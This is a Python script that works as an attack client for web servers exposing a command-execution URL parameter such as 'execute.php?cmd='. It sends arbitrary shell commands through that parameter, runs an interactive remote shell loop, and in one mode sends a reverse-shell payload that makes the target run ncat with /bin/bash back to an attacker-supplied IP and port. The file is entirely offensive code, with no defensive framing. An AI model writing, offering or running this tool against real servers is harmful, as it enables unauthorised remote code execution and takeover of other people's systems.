import requests

def validate_url(url):
    return url.startswith("http://") or url.startswith("https://")

def run_single_command(target_url):
    cmd = input("[?] Enter command to execute: ")
    response = requests.get(target_url + cmd)
    if response.status_code == 200:
        print("[+] Command output:\n")
        print(response.text)
    else:
        print("[-] Exploit failed. HTTP Status:", response.status_code)

def interactive_shell(target_url):
    print("[*] Starting interactive shell. Type 'exit' to quit.")
    while True:
        cmd = input("Shell> ")
        if cmd.lower() in ["exit", "quit"]:
            break
        response = requests.get(target_url + cmd)
        if response.status_code == 200:
            print(response.text)
        else:
            print("[-] Exploit failed")

def reverse_shell(target_url):
    attacker_ip = input("[?] Enter your IP for reverse shell: ")
    attacker_port = input("[?] Enter your port for reverse shell listener: ")
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    print("[+] Sending reverse shell payload...")
    try:
        requests.get(target_url + payload)
        print("[!] Payload sent. Check your listener.")
    except requests.RequestException as e:
        print("[-] Failed to send reverse shell payload:", e)

# === Start ===
url = input("Enter full exploit URL (e.g. http://target.com/execute.php?cmd=): ").strip()

if not validate_url(url):
    print("[-] Invalid URL. Must start with http:// or https://")
    exit()

print("""
Choose mode:
[1] Run single command
[2] Interactive shell
[3] Send reverse shell payload
""")

choice = input("[?] Enter choice (1/2/3): ").strip()

if choice == "1":
    run_single_command(url)
elif choice == "2":
    interactive_shell(url)
elif choice == "3":
    reverse_shell(url)
else:
    print("[-] Invalid option selected.")
